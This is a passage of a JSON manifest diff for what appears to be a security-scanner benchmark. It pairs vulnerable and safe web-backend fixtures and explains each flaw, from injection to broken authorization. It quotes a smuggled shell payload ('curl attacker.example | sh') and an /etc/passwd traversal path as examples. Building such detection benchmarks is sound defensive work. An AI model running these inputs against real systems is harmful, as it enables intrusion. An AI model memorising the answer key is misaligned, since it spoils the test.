+      "id": "nextjs-server-actions-profile-update",
+      "family": "nextjs-server-actions",
+      "architecture": "Next.js 15/16 \"use server\" module exporting two actions bound to the same settings form",
+      "language": "typescript",
+      "file": "nextjs-server-actions/profile-actions.ts",
+      "scanAs": "app/actions/profile.ts",
+      "kind": "vulnerable",
+      "category": "missing_authentication",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "line": 14,
+      "lineRange": [
+        14,
+        31
+      ],
+      "runtimeVerifiable": true,
+      "why": "A server action is a POST endpoint reachable by anyone who can address it, and this one writes the profile row identified by a hidden userId field without ever reading the session cookie; removeAvatar in the same module resolves a session first, so the check was simply forgotten here."
+    },
+    {
+      "id": "nextjs-server-actions-account-update",
+      "family": "nextjs-server-actions",
+      "language": "typescript",
+      "file": "nextjs-server-actions/account-actions.ts",
+      "scanAs": "app/actions/account.ts",
+      "kind": "safe",
+      "pairedWith": "nextjs-server-actions-profile-update",
+      "why": "Both exported actions resolve the session cookie first and return early without one, and the row to update is identified by session.userId rather than by a field from the form."
+    },
+    {
+      "id": "nextjs-server-actions-member-settings",
+      "family": "nextjs-server-actions",
+      "architecture": "Next.js 15/16 \"use server\" module saving a schema-generated settings form",
+      "language": "typescript",
+      "file": "nextjs-server-actions/member-settings-actions.ts",
+      "scanAs": "app/actions/member-settings.ts",
+      "kind": "vulnerable",
+      "category": "mass_assignment",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "line": 33,
+      "lineRange": [
+        24,
+        33
+      ],
+      "runtimeVerifiable": true,
+      "why": "Every field of the posted FormData is turned into an object and spread into the update, so a caller who adds role, planTier or creditsCents to the request writes those columns; the action is a network endpoint, so the fields the UI happens to render are not a constraint."
+    },
+    {
+      "id": "nextjs-server-actions-notification-settings",
+      "family": "nextjs-server-actions",
+      "language": "typescript",
+      "file": "nextjs-server-actions/notification-settings-actions.ts",
+      "scanAs": "app/actions/notification-settings.ts",
+      "kind": "safe",
+      "pairedWith": "nextjs-server-actions-member-settings",
+      "why": "The four expected fields are read individually, validated by a strict schema that rejects unknown keys, and assigned to named columns, so nothing a caller invents can reach the update."
+    },
+    {
+      "id": "nextjs-server-actions-invoice-note",
+      "family": "nextjs-server-actions",
+      "architecture": "Next.js 15/16 \"use server\" module updating a record identified by a form field",
+      "language": "typescript",
+      "file": "nextjs-server-actions/invoice-notes-actions.ts",
+      "scanAs": "app/actions/invoice-notes.ts",
+      "kind": "vulnerable",
+      "category": "broken_object_level_authorization",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "line": 36,
+      "lineRange": [
+        22,
+        37
+      ],
+      "runtimeVerifiable": true,
+      "why": "The action authenticates the caller and then updates the invoice named by the form's invoiceId with no tenant predicate, so any signed-in user can overwrite the internal notes of another organization's invoice by posting a different id."
+    },
+    {
+      "id": "nextjs-server-actions-invoice-status",
+      "family": "nextjs-server-actions",
+      "language": "typescript",
+      "file": "nextjs-server-actions/invoice-status-actions.ts",
+      "scanAs": "app/actions/invoice-status.ts",
+      "kind": "safe",
+      "pairedWith": "nextjs-server-actions-invoice-note",
+      "why": "The update also takes the invoice id from the form, but the where clause pairs it with the session's organization and the empty returning result is reported as not found, so a foreign id changes nothing and reveals nothing."
+    },
+    {
+      "id": "nextjs-server-actions-workspace-plan",
+      "family": "nextjs-server-actions",
+      "architecture": "Next.js 15/16 \"use server\" module performing a billing-level workspace change",
+      "language": "typescript",
+      "file": "nextjs-server-actions/workspace-plan-actions.ts",
+      "scanAs": "app/actions/workspace-plan.ts",
+      "kind": "vulnerable",
+      "category": "broken_function_level_authorization",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "line": 44,
+      "lineRange": [
+        37,
+        48
+      ],
+      "runtimeVerifiable": true,
+      "why": "The action loads the caller's membership and even selects the role column, but never compares it: any member of the workspace, including a viewer, can change the plan and the seat limit and push the change to the payment provider."
+    },
+    {
+      "id": "nextjs-server-actions-workspace-seats",
+      "family": "nextjs-server-actions",
+      "language": "typescript",
+      "file": "nextjs-server-actions/workspace-seats-actions.ts",
+      "scanAs": "app/actions/workspace-seats.ts",
+      "kind": "safe",
+      "pairedWith": "nextjs-server-actions-workspace-plan",
+      "why": "The same billing change requires the membership role to be one of the two billing roles before the update runs, so being signed in and a member of the workspace is not by itself sufficient."
+    },
+    {
+      "id": "nextjs-server-actions-cart-checkout",
+      "family": "nextjs-server-actions",
+      "architecture": "Next.js 15/16 \"use server\" module creating an order and a payment intent from a posted form",
+      "language": "typescript",
+      "file": "nextjs-server-actions/cart-checkout-actions.ts",
+      "scanAs": "app/actions/cart-checkout.ts",
+      "kind": "vulnerable",
+      "category": "business_logic_price_manipulation",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "line": 34,
+      "lineRange": [
+        21,
+        34
+      ],
+      "runtimeVerifiable": true,
+      "why": "The order total is computed from a unit price and a quantity taken straight from the form, and the payment intent is created for that amount, so a caller can buy at a price they chose; the quantity is not bounded or checked against stock, and a negative value inverts the total."
+    },
+    {
+      "id": "nextjs-server-actions-cart-quantity",
+      "family": "nextjs-server-actions",
+      "language": "typescript",
+      "file": "nextjs-server-actions/cart-quantity-actions.ts",
+      "scanAs": "app/actions/cart-quantity.ts",
+      "kind": "safe",
+      "pairedWith": "nextjs-server-actions-cart-checkout",
+      "why": "Only the product id and the quantity come from the form; the quantity must be a positive integer within a fixed per-line cap and available in stock, and both the unit price and the currency are read from the product row, so the total is server-determined."
+    },
+    {
+      "id": "nextjs-server-actions-rpc-dispatch",
+      "family": "nextjs-server-actions",
+      "architecture": "Hand-rolled POST RPC route handler alongside the action modules, authenticating with the same cross-site session cookie",
+      "language": "typescript",
+      "file": "nextjs-server-actions/rpc-dispatch-route.ts",
+      "scanAs": "app/api/rpc/[procedure]/route.ts",
+      "kind": "vulnerable",
+      "category": "missing_csrf_protection",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "POST /api/rpc/:procedure",
+      "line": 76,
+      "lineRange": [
+        68,
+        76
+      ],
+      "runtimeVerifiable": true,
+      "why": "This endpoint mutates state — renaming the workspace, removing a member, rotating an API key — on the strength of a session cookie that the module itself re-issues with sameSite none, and it accepts a plain form-encoded body with no origin or referer check and no synchroniser token, so a form on any page can drive it in a victim's browser. Next.js server actions do not have this exposure: the framework only accepts them as POST with its own action id and compares the Origin header against the request Host, rejecting a cross-site invocation before any handler code runs."
+    },
+    {
+      "id": "nextjs-server-actions-rpc-gateway",
+      "family": "nextjs-server-actions",
+      "language": "typescript",
+      "file": "nextjs-server-actions/rpc-gateway-route.ts",
+      "scanAs": "app/api/rpc/gateway/[procedure]/route.ts",
+      "kind": "safe",
+      "pairedWith": "nextjs-server-actions-rpc-dispatch",
+      "why": "The same dispatcher rejects any request whose Origin is not one of the two known front ends and requires the x-mq-csrf header to equal the double-submit cookie under a constant-time comparison, so a cross-site page can neither set the header nor read the token."
+    },
+    {
+      "id": "plain-http-report-derived-column",
+      "family": "plain-http",
+      "architecture": "node:http server dispatching with a switch over `${request.method} ${url.pathname}`",
+      "language": "javascript",
+      "file": "plain-http/report-formula.js",
+      "kind": "vulnerable",
+      "category": "code_injection",
+      "severityBand": [
+        "critical",
+        "high"
+      ],
+      "route": "POST /api/reports/columns",
+      "line": 62,
+      "lineRange": [
+        61,
+        64
+      ],
+      "runtimeVerifiable": true,
+      "why": "The derived-column formula arrives in the request body and is compiled into a vm.Script that is then run in the server's own context, so anyone who can reach the endpoint executes arbitrary JavaScript inside the reporting process."
+    },
+    {
+      "id": "plain-http-report-derived-column-catalogue",
+      "family": "plain-http",
+      "language": "javascript",
+      "file": "plain-http/report-metrics.js",
+      "kind": "safe",
+      "pairedWith": "plain-http-report-derived-column",
+      "why": "The client sends a metric key rather than an expression; the projection is one of four functions defined in this module, an unknown key is rejected with the supported list, and nothing from the request is ever compiled or evaluated."
+    },
+    {
+      "id": "plain-http-draft-resume-snapshot",
+      "family": "plain-http",
+      "architecture": "node:http server dispatching with an if-chain over the method and a trailing-slash-normalised pathname",
+      "language": "javascript",
+      "file": "plain-http/draft-resume.js",
+      "kind": "vulnerable",
+      "category": "unsafe_deserialization",
+      "severityBand": [
+        "critical",
+        "high"
+      ],
+      "route": "POST /editor/drafts/resume",
+      "line": 57,
+      "lineRange": [
+        56,
+        57
+      ],
+      "runtimeVerifiable": true,
+      "why": "The base64 snapshot posted by the client is decoded and handed to node-serialize's unserialize, which rebuilds and immediately invokes functions embedded in the payload, so a crafted snapshot runs code on the editor host."
+    },
+    {
+      "id": "plain-http-draft-resume-snapshot-validated",
+      "family": "plain-http",
+      "language": "javascript",
+      "file": "plain-http/draft-checkpoint.js",
+      "kind": "safe",
+      "pairedWith": "plain-http-draft-resume-snapshot",
+      "why": "The decoded snapshot goes through JSON.parse and then a field-by-field check that copies only draftId, title, body and revision under type, format and length constraints, so no type or callable from the payload is reconstructed."
+    },
+    {
+      "id": "plain-http-workspace-preference-patch",
+      "family": "plain-http",
+      "architecture": "node:http server dispatching with a RegExp exec over url.pathname to capture the workspace id",
+      "language": "javascript",
+      "file": "plain-http/workspace-preferences.js",
+      "kind": "vulnerable",
+      "category": "prototype_pollution",
+      "severityBand": [
+        "high",
+        "medium"
+      ],
+      "route": "PATCH /api/workspaces/:workspaceId/preferences",
+      "line": 42,
+      "lineRange": [
+        41,
+        52
+      ],
+      "runtimeVerifiable": true,
+      "why": "applyPatch walks every key of the request body and assigns straight onto the target with no reserved-key check, so a body containing __proto__ or constructor.prototype writes onto Object.prototype and changes object behaviour for the whole process."
+    },
+    {
+      "id": "plain-http-workspace-preference-patch-guarded",
+      "family": "plain-http",
+      "language": "javascript",
+      "file": "plain-http/account-preferences.js",
+      "kind": "safe",
+      "pairedWith": "plain-http-workspace-preference-patch",
+      "why": "The same recursive merge skips __proto__, constructor and prototype, creates intermediate nodes with Object.create(null) and tests membership with Object.hasOwn, so no key in the request body can reach Object.prototype."
+    },
+    {
+      "id": "plain-http-invoice-document-import",
+      "family": "plain-http",
+      "architecture": "node:http server dispatching through a route-table object keyed by `${request.method} ${url.pathname}`",
+      "language": "javascript",
+      "file": "plain-http/invoice-import.js",
+      "kind": "vulnerable",
+      "category": "xml_external_entity",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "POST /api/invoices/import",
+      "line": 51,
+      "lineRange": [
+        51,
+        56
+      ],
+      "runtimeVerifiable": true,
+      "why": "The supplier-supplied document is parsed with entity substitution (noent) and external DTD loading (dtdload) enabled and no network restriction, so a DOCTYPE declaring a SYSTEM entity makes the importer read local files or fetch internal URLs and echo them back in the mapped invoice."
+    },
+    {
+      "id": "plain-http-invoice-document-import-pinned",
+      "family": "plain-http",
+      "language": "javascript",
+      "file": "plain-http/statement-import.js",
+      "kind": "safe",
+      "pairedWith": "plain-http-invoice-document-import",
+      "why": "The same parser is configured with noent, dtdload, dtdattr and dtdvalid all off and nonet on, so a DOCTYPE in the uploaded document resolves nothing and no external reference is fetched."
+    },
+    {
+      "id": "plain-http-notification-template-preview",
+      "family": "plain-http",
+      "architecture": "node:http server dispatching with RegExp.prototype.test against url.pathname and a split() for the slug",
+      "language": "javascript",
+      "file": "plain-http/notification-preview.js",
+      "kind": "vulnerable",
+      "category": "template_injection",
+      "severityBand": [
+        "critical",
+        "high"
+      ],
+      "route": "POST /admin/notifications/:slug/preview",
+      "line": 63,
+      "lineRange": [
+        62,
+        64
+      ],
+      "runtimeVerifiable": true,
+      "why": "The draft markup from the request body is passed to handlebars.compile, so the request supplies the template program rather than its data; a Handlebars template reaches JavaScript through helper and prototype paths and is rendered server-side."
+    },
+    {
+      "id": "plain-http-notification-template-preview-layouts",
+      "family": "plain-http",
+      "language": "javascript",
+      "file": "plain-http/notification-digest.js",
+      "kind": "safe",
+      "pairedWith": "plain-http-notification-template-preview",
+      "why": "The request only picks one of the three layouts that ship with the release; those are read from disk and compiled once at boot, and the subject, headline and intro from the request are passed as context, which Handlebars escapes."
+    },
+    {
+      "id": "plain-http-password-reset-token",
+      "family": "plain-http",
+      "architecture": "node:http server with a method guard and a switch over url.pathname, form-encoded body",
+      "language": "javascript",
+      "file": "plain-http/password-reset-request.js",
+      "kind": "vulnerable",
+      "category": "insecure_randomness",
+      "severityBand": [
+        "high",
+        "medium"
+      ],
+      "route": "POST /auth/password-reset",
+      "line": 37,
+      "lineRange": [
+        36,
+        60
+      ],
+      "runtimeVerifiable": true,
+      "why": "The reset token is two Math.random draws in base 36; Math.random is a non-cryptographic PRNG whose internal state is recoverable from a handful of observed outputs, so tokens issued to other accounts can be predicted inside the 30-minute window and used to take the account over."
+    },
+    {
+      "id": "plain-http-password-reset-token-random",
+      "family": "plain-http",
+      "language": "javascript",
+      "file": "plain-http/email-change-request.js",
+      "kind": "safe",
+      "pairedWith": "plain-http-password-reset-token",
+      "why": "The confirmation token is 32 bytes from crypto.randomBytes rendered base64url, and only its SHA-256 digest is stored, so the value is unguessable and a leak of the table does not yield working links."
+    },
+    {
+      "id": "plain-http-portal-session-issue",
+      "family": "plain-http",
+      "architecture": "node:http server dispatching through an array route table matched with Array.prototype.find",
+      "language": "javascript",
+      "file": "plain-http/portal-login.js",
+      "kind": "vulnerable",
+      "category": "weak_session_identifier",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "POST /portal/login",
+      "line": 37,
+      "lineRange": [
+        35,
+        38
+      ],
+      "runtimeVerifiable": true,
+      "why": "The session cookie is an MD5 digest of the user id, a process-local counter and the millisecond clock, all of which an attacker can enumerate or observe, so a valid session identifier can be reconstructed offline and replayed even though the cookie flags are correct."
+    },
+    {
+      "id": "plain-http-portal-session-issue-random",
+      "family": "plain-http",
+      "language": "javascript",
+      "file": "plain-http/console-login.js",
+      "kind": "safe",
+      "pairedWith": "plain-http-portal-session-issue",
+      "why": "The session identifier is 32 bytes of crypto.randomBytes as hex, derived from nothing about the account, the clock or a counter, so no observed session narrows the search for another."
+    },
+    {
+      "id": "plain-http-ticket-search-filters",
+      "family": "plain-http",
+      "architecture": "node:http server dispatching through an array route table of RegExp patterns tested against url.pathname",
+      "language": "javascript",
+      "file": "plain-http/ticket-search.js",
+      "kind": "vulnerable",
+      "category": "unsafe_query_composition",
+      "severityBand": [
+        "critical",
+        "high"
+      ],
+      "route": "GET /api/tickets",
+      "line": 39,
+      "lineRange": [
+        31,
+        47
+      ],
+      "runtimeVerifiable": true,
+      "why": "The free-text term, status filter, sort column and limit taken from the query string are interpolated into the SQL text and the statement is executed with no bound parameters, so a quote in q or an expression in sort changes the query the database runs."
+    },
+    {
+      "id": "plain-http-ticket-search-filters-bound",
+      "family": "plain-http",
+      "language": "javascript",
+      "file": "plain-http/asset-search.js",
+      "kind": "safe",
+      "pairedWith": "plain-http-ticket-search-filters",
+      "why": "Every value from the query string is pushed onto the values array and referenced by a numbered placeholder, the sort column is resolved through a fixed map, the direction collapses to ASC or DESC and the limit is parsed and clamped, so the statement text does not vary with user input."
+    },
+    {
+      "id": "plain-http-media-metadata-probe",
+      "family": "plain-http",
+      "architecture": "node:http server dispatching with a RegExp exec over url.pathname to capture the asset id",
+      "language": "javascript",
+      "file": "plain-http/media-probe.js",
+      "kind": "vulnerable",
+      "category": "command_injection",
+      "severityBand": [
+        "critical",
+        "high"
+      ],
+      "route": "POST /api/media/:assetId/probe",
+      "line": 58,
+      "lineRange": [
+        58,
+        61
+      ],
+      "runtimeVerifiable": true,
+      "why": "The sourceUrl field from the request body is interpolated into a command string that is run through child_process.exec, which spawns a shell, so $(...) or a semicolon in the value executes arbitrary commands on the media host; the surrounding double quotes do not stop substitution."
+    },
+    {
+      "id": "plain-http-media-metadata-probe-argv",
+      "family": "plain-http",
+      "language": "javascript",
+      "file": "plain-http/waveform-render.js",
+      "kind": "safe",
+      "pairedWith": "plain-http-media-metadata-probe",
+      "why": "The path is built from the asset record's own id and extension, checked to stay inside the media root, and passed as one element of a fixed argv array to execFile, so no shell is involved and the request cannot contribute a command."
+    },
+    {
+      "id": "plain-http-basket-checkout-totals",
+      "family": "plain-http",
+      "architecture": "node:http server dispatching with an if-chain comparing request.method and url.pathname",
+      "language": "javascript",
+      "file": "plain-http/checkout-order.js",
+      "kind": "vulnerable",
+      "category": "business_logic_price_manipulation",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "POST /api/checkout",
+      "line": 56,
+      "lineRange": [
+        52,
+        62
+      ],
+      "runtimeVerifiable": true,
+      "why": "The line totals, subtotal and shipping are computed from the unitPriceCents, quantity and shippingCents values the client posted, and that total is the amount authorised, so a shopper can set any price; quantity is also unbounded and never checked for being a positive integer."
+    },
+    {
+      "id": "plain-http-basket-checkout-totals-catalogue",
+      "family": "plain-http",
+      "language": "javascript",
+      "file": "plain-http/order-submit.js",
+      "kind": "safe",
+      "pairedWith": "plain-http-basket-checkout-totals",
+      "why": "Unit prices come from the product rows loaded by SKU, shipping is priced by the server-side table, and each quantity must be an integer between one and ten, so the request can only choose which article is ordered and how many."
+    },
+    {
+      "id": "plain-http-wallet-withdrawal-debit",
+      "family": "plain-http",
+      "architecture": "node:http server dispatching through a Map keyed by `${request.method} ${url.pathname}`",
+      "language": "javascript",
+      "file": "plain-http/wallet-withdrawal.js",
+      "kind": "vulnerable",
+      "category": "race_condition_double_spend",
+      "severityBand": [
+        "high",
+        "medium"
+      ],
+      "route": "POST /api/wallet/withdrawals",
+      "line": 70,
+      "lineRange": [
+        56,
+        73
+      ],
+      "runtimeVerifiable": true,
+      "why": "The balance is read, compared in application code, and written back as a value computed in JavaScript with no transaction, no row lock and no idempotency key, so two concurrent withdrawals both pass the sufficiency check and the second UPDATE overwrites the first, paying out the balance twice. A static reading should be reported as needs_review rather than confirmed, because the interleaving cannot be observed without driving the endpoint concurrently."
+    },
+    {
+      "id": "plain-http-wallet-withdrawal-debit-atomic",
+      "family": "plain-http",
+      "language": "javascript",
+      "file": "plain-http/wallet-transfer.js",
+      "kind": "safe",
+      "pairedWith": "plain-http-wallet-withdrawal-debit",
+      "why": "The debit is a single conditional UPDATE carrying balance_cents >= $1 in its WHERE clause whose rowCount decides the outcome, it runs inside the transaction that queues the payout and writes the ledger entry, and a uniquely constrained request key makes a retried tap replay the original transfer instead of creating a second one."
+    },
+    {
+      "id": "python-fastapi-revenue-segment-filter",
+      "family": "python-fastapi",
+      "architecture": "FastAPI APIRouter modules with async path operations, SQLAlchemy 2.0 Session injected through Depends(get_session), the authenticated subject through Depends(get_current_user), Pydantic v2 request and response models, and HTTPException for error responses",
+      "language": "python",
+      "file": "python-fastapi/revenue_reports.py",
+      "kind": "vulnerable",
+      "category": "sql_injection",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "GET /reports/revenue",
+      "line": 53,
+      "lineRange": [
+        53,
+        68
+      ],
+      "runtimeVerifiable": true,
+      "why": "Every other predicate in this report is a bound parameter, but the segment filter is formatted into the WHERE clause as a single-quoted literal and joined into the text() statement that session.execute runs, so a segment value containing a quote closes the literal and appends attacker-chosen SQL — including a UNION over other accounts' rows — to a statement that otherwise scopes to current_user.account_id.",
+      "detectionRequires": "A Python AST with taint from FastAPI Query parameters, tracking the f-string composition into the list joined inside sqlalchemy.text() and recognising session.execute(text(...)) as the query sink even though a params dict is also passed."
+    },
+    {
+      "id": "python-fastapi-usage-project-filter",
+      "family": "python-fastapi",
+      "language": "python",
+      "file": "python-fastapi/usage_reports.py",
+      "kind": "safe",
+      "pairedWith": "python-fastapi-revenue-segment-filter",
+      "why": "The same optional filter is appended as a named bind parameter and its value is put into the params dict, so the only interpolated fragment is the grouping expression resolved through the fixed GROUP_EXPRESSIONS map behind a regex-validated query parameter, and no request text becomes statement text."
+    },
+    {
+      "id": "python-fastapi-rendition-encode",
+      "family": "python-fastapi",
+      "architecture": "FastAPI APIRouter modules with async path operations, SQLAlchemy 2.0 Session injected through Depends(get_session), the authenticated subject through Depends(get_current_user), Pydantic v2 request and response models, and HTTPException for error responses",
+      "language": "python",
+      "file": "python-fastapi/media_transcode.py",
+      "kind": "vulnerable",
+      "category": "command_injection",
+      "severityBand": [
+        "critical",
+        "high"
+      ],
+      "route": "POST /media/:asset_id/renditions",
+      "line": 58,
+      "lineRange": [
+        56,
+        69
+      ],
+      "runtimeVerifiable": true,
+      "why": "The two file paths are shlex.quote'd but the request body's preset and audio_bitrate are interpolated raw into the same command string, which is then handed to subprocess.run with shell=True; a preset of \"medium; curl attacker.example | sh\" runs as a second shell command with the service account's privileges.",
+      "detectionRequires": "The Python AST plus the subprocess.run shell=True keyword argument as a sink, and enough taint precision to see that the interpolated Pydantic body fields preset and audio_bitrate are not covered by the shlex.quote calls applied to the neighbouring path segments."
+    },
+    {
+      "id": "python-fastapi-waveform-render",
+      "family": "python-fastapi",
+      "language": "python",
+      "file": "python-fastapi/waveform_render.py",
+      "kind": "safe",
+      "pairedWith": "python-fastapi-rendition-encode",
+      "why": "The encoder is invoked with an argv list and shell=False, so no shell parses the arguments, and the only free-text body field is rejected unless it is in the ALLOWED_COLOURS set while the remaining fields are an int range and a Literal."
+    },
+    {
+      "id": "python-fastapi-message-attachment-stream",
+      "family": "python-fastapi",
+      "architecture": "FastAPI APIRouter modules with async path operations, SQLAlchemy 2.0 Session injected through Depends(get_session), the authenticated subject through Depends(get_current_user), Pydantic v2 request and response models, and HTTPException for error responses",
+      "language": "python",
+      "file": "python-fastapi/attachment_download.py",
+      "kind": "vulnerable",
+      "category": "path_traversal",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "GET /messages/:message_id/attachments/:filename",
+      "line": 45,
+      "lineRange": [
+        44,
+        51
+      ],
+      "runtimeVerifiable": true,
+      "why": "The filename path parameter is declared with the :path converter, so it may contain slashes, and it is joined onto the message's storage directory with no containment check before FileResponse streams the result; a request for ../../../../etc/passwd or a relative path into another tenant's prefix returns that file, and os.path.basename is applied only to the download name, not to the path that is opened.",
+      "detectionRequires": "The Python AST, the Starlette :path route converter to know the parameter can hold separators, os.path.join with a request-derived component as the composition, and FileResponse (or open) as the file-read sink, plus the absence of a resolve()/commonpath containment check on that path."
+    },
+    {
+      "id": "python-fastapi-report-artefact-stream",
+      "family": "python-fastapi",
+      "language": "python",
+      "file": "python-fastapi/report_download.py",
+      "kind": "safe",
+      "pairedWith": "python-fastapi-message-attachment-stream",
+      "why": "The joined path is resolved and rejected with a 400 unless Path.is_relative_to shows it still sits inside the resolved base directory for that report run, so traversal segments cannot escape the run's own prefix."
+    },
+    {
+      "id": "python-fastapi-order-detail-drawer",
+      "family": "python-fastapi",
+      "architecture": "FastAPI APIRouter modules with async path operations, SQLAlchemy 2.0 Session injected through Depends(get_session), the authenticated subject through Depends(get_current_user), Pydantic v2 request and response models, and HTTPException for error responses",
+      "language": "python",
+      "file": "python-fastapi/order_detail.py",
+      "kind": "vulnerable",
+      "category": "broken_object_level_authorization",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "GET /orders/:order_id",
+      "line": 48,
+      "lineRange": [
+        41,
+        50
+      ],
+      "runtimeVerifiable": true,
+      "why": "The detail endpoint loads the order with session.get on the path parameter alone; current_user is injected and used by the list endpoint above but never reaches this query, so any authenticated caller can read another account's order, billing email and shipping address by substituting the id.",
+      "detectionRequires": "The Python AST, knowledge that Depends(get_current_user) marks the authenticated subject, and recognition that session.get(Model, path_param) is a primary-key read whose predicate cannot include an owner column — the check a JS-only engine cannot perform on this file at all."
+    },
+    {
+      "id": "python-fastapi-shipment-detail-drawer",
+      "family": "python-fastapi",
+      "language": "python",
+      "file": "python-fastapi/shipment_detail.py",
+      "kind": "safe",
+      "pairedWith": "python-fastapi-order-detail-drawer",
+      "why": "The detail endpoint selects on both the path parameter and Shipment.account_id == current_user.account_id, so another account's shipment resolves to None and is returned as a 404 rather than disclosed."
+    },
+    {
+      "id": "python-fastapi-workflow-definition-import",
+      "family": "python-fastapi",
+      "architecture": "FastAPI APIRouter modules with async path operations, SQLAlchemy 2.0 Session injected through Depends(get_session), the authenticated subject through Depends(get_current_user), Pydantic v2 request and response models, and HTTPException for error responses",
+      "language": "python",
+      "file": "python-fastapi/workflow_import.py",
+      "kind": "vulnerable",
+      "category": "unsafe_deserialization",
+      "severityBand": [
+        "critical",
+        "high"
+      ],
+      "route": "POST /workflows/imports",
+      "line": 35,
+      "lineRange": [
+        32,
+        35
+      ],
+      "runtimeVerifiable": true,
+      "why": "The uploaded file is parsed with yaml.load under yaml.Loader, which honours the python/object and python/object/apply constructors, so a crafted definition executes arbitrary Python during parsing; the size limit and the later isinstance and \"steps\" checks all run after the document has already been constructed.",
+      "detectionRequires": "The Python AST, a rule that treats yaml.load with any Loader other than SafeLoader (and pickle.loads) as a deserialization sink, and taint from the UploadFile.read() body to that call."
+    },
+    {
+      "id": "python-fastapi-pipeline-definition-import",
+      "family": "python-fastapi",
+      "language": "python",
+      "file": "python-fastapi/pipeline_import.py",
+      "kind": "safe",
+      "pairedWith": "python-fastapi-workflow-definition-import",
+      "why": "The same upload flow parses with yaml.safe_load, which constructs only plain scalars, lists and dicts, and the result must then satisfy a Pydantic model before anything is persisted, so no object in the document can be instantiated by the parser."
+    },
+    {
+      "id": "trpc-order-detail-drawer",
+      "family": "trpc",
+      "architecture": "tRPC 11 routers in TypeScript composed with router({ ... }), publicProcedure and protectedProcedure, Zod input schemas, a Prisma client and the session on ctx, and TRPCError for failures — procedures are addressed by dotted procedure path rather than by HTTP method and path",
+      "language": "typescript",
+      "file": "trpc/orders-router.ts",
+      "kind": "vulnerable",
+      "category": "broken_object_level_authorization",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "orders.byId",
+      "line": 32,
+      "lineRange": [
+        31,
+        43
+      ],
+      "runtimeVerifiable": true,
+      "why": "byId resolves the order from input.orderId alone; protectedProcedure establishes that a session exists but ctx.session.organizationId never reaches the query, so any signed-in user can read another tenant's order, billing e-mail and shipping address. The list and resendConfirmation procedures in the same router show the tenant scoping this one drops. Recorded with the tRPC procedure path instead of a route because the procedure is not bound to an HTTP path."
+    },
+    {
+      "id": "trpc-invoice-detail-drawer",
+      "family": "trpc",
+      "language": "typescript",
+      "file": "trpc/invoices-router.ts",
+      "kind": "safe",
+      "pairedWith": "trpc-order-detail-drawer",
+      "why": "The same detail-drawer procedure shape, but the lookup is a findFirst keyed on both input.invoiceId and ctx.session.organizationId, so another tenant's invoice comes back null and the procedure throws NOT_FOUND."
+    },
+    {
+      "id": "trpc-membership-role-dropdown",
+      "family": "trpc",
+      "architecture": "tRPC 11 routers in TypeScript composed with router({ ... }), publicProcedure and protectedProcedure, Zod input schemas, a Prisma client and the session on ctx, and TRPCError for failures — procedures are addressed by dotted procedure path rather than by HTTP method and path",
+      "language": "typescript",
+      "file": "trpc/members-router.ts",
+      "kind": "vulnerable",
+      "category": "broken_function_level_authorization",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "members.setRole",
+      "line": 38,
+      "lineRange": [
+        26,
+        42
+      ],
+      "runtimeVerifiable": true,
+      "why": "setRole is reachable by every member of the organization: the membership is correctly tenant-scoped, but nothing checks the caller's own role before writing the new one, so a viewer can call members.setRole against their own membership and become owner. The remove procedure directly below it performs exactly the owner/admin check that this one is missing. Recorded with the tRPC procedure path instead of a route because the procedure is not bound to an HTTP path."
+    },
+    {
+      "id": "trpc-project-role-dropdown",
+      "family": "trpc",
+      "language": "typescript",
+      "file": "trpc/roles-router.ts",
+      "kind": "safe",
+      "pairedWith": "trpc-membership-role-dropdown",
+      "why": "The same role-writing mutation, but the caller's own assignment on that project is loaded first and the mutation throws FORBIDDEN unless that assignment is maintainer or lead, so an ordinary contributor cannot promote anyone."
+    },
+    {
+      "id": "trpc-profile-autosave-patch",
+      "family": "trpc",
+      "architecture": "tRPC 11 routers in TypeScript composed with router({ ... }), publicProcedure and protectedProcedure, Zod input schemas, a Prisma client and the session on ctx, and TRPCError for failures — procedures are addressed by dotted procedure path rather than by HTTP method and path",
+      "language": "typescript",
+      "file": "trpc/profile-router.ts",
+      "kind": "vulnerable",
+      "category": "mass_assignment",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "profile.update",
+      "line": 43,
+      "lineRange": [
+        32,
+        43
+      ],
+      "runtimeVerifiable": true,
+      "why": "The input schema accepts an open record of arbitrary keys and the whole patch is spread into the Prisma update, so the caller chooses which user columns are written — role, plan and emailVerified are all readable on the neighbouring query and all writable here. Recorded with the tRPC procedure path instead of a route because the procedure is not bound to an HTTP path."
+    },
+    {
+      "id": "trpc-settings-autosave-patch",
+      "family": "trpc",
+      "language": "typescript",
+      "file": "trpc/settings-router.ts",
+      "kind": "safe",
+      "pairedWith": "trpc-profile-autosave-patch",
+      "why": "The same sparse autosave patch, but the input is a strict Zod object naming the four editable fields and each one is copied across individually, so no key the client invents can reach the update."
+    },
+    {
+      "id": "trpc-revenue-breakdown-filter",
+      "family": "trpc",
+      "architecture": "tRPC 11 routers in TypeScript composed with router({ ... }), publicProcedure and protectedProcedure, Zod input schemas, a Prisma client and the session on ctx, and TRPCError for failures — procedures are addressed by dotted procedure path rather than by HTTP method and path",
+      "language": "typescript",
+      "file": "trpc/reports-router.ts",
+      "kind": "vulnerable",
+      "category": "sql_injection",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "reports.revenueBreakdown",
+      "line": 35,
+      "lineRange": [
+        34,
+        48
+      ],
+      "runtimeVerifiable": true,
+      "why": "The organization and date bounds are bound as positional parameters, but the optional channel filter is wrapped in single quotes and concatenated into the WHERE clause of a $queryRawUnsafe call, so a channel value containing a quote closes the literal and appends attacker-chosen SQL. The Zod string with a max length constrains the shape of the value, not its content."
+    },
+    {
+      "id": "trpc-usage-breakdown-filter",
+      "family": "trpc",
+      "language": "typescript",
+      "file": "trpc/metrics-router.ts",
